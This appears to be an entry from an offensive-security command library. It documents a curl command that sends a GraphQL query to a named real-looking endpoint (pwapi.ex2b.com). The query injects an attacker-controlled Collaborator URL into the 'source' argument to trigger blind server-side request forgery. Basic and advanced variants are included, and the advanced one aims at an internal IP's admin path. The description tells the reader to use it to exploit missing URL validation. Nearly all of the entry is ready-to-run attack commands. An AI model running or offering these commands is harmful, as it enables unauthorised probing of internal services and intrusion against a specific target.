---
id: e78135f4-b43a-42ea-91f7-d71ac71af0c3
name: curl-graphql-ssrf
type: command
executor: bash
data: >-
  curl -X POST https://pwapi.ex2b.com/graphql -H "Content-Type:
  application/json" -d '{"query": "query { allTicks(source:
  \"http://[collaborator-domain]/test\") { id } }"}'
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:00.395Z'
platforms:
  - Linux
  - macOS
  - Windows
tags:
  - ssrf
  - graphql
verified: false
validated: true
submitted: true
---

# curl-graphql-ssrf

## Command

```bash
curl -X POST https://pwapi.ex2b.com/graphql -H "Content-Type: application/json" -d '{"query": "query { allTicks(source: \"http://[collaborator-domain]/test\") { id } }"}'
```

## Description

This command sends a POST request to the GraphQL endpoint, injecting a Collaborator URL into the 'source' parameter of the 'allTicks' query to trigger SSRF. Use it to exploit the lack of URL validation for blind internal requests.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies POST method | Yes |
| `-H "Content-Type: application/json"` | Sets JSON header | Yes |
| `-d '{...}'` | Query body with malicious source | Yes |
| `[collaborator-domain]` | Replace with actual Collaborator URL | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://pwapi.ex2b.com/graphql -H "Content-Type: application/json" -d '{"query": "query { allTicks(source: \"http://example.com/test\") { id } }"}'
```

### Advanced Usage

```bash
curl -X POST https://pwapi.ex2b.com/graphql -H "Content-Type: application/json" -H "User-Agent: Mozilla/5.0" -d '{"query": "query { allTicks(source: \"http://internal-ip:port/admin\") { id } }"}'
```

## Expected Output

JSON response such as {"data":{"allTicks":[]}}, indicating successful query execution without errors, though no internal data is returned due to blind SSRF.

## Related

- [[Related Procedure|procedures/Send-Malicious-GraphQL-Query-to-Trigger-SSRF]]
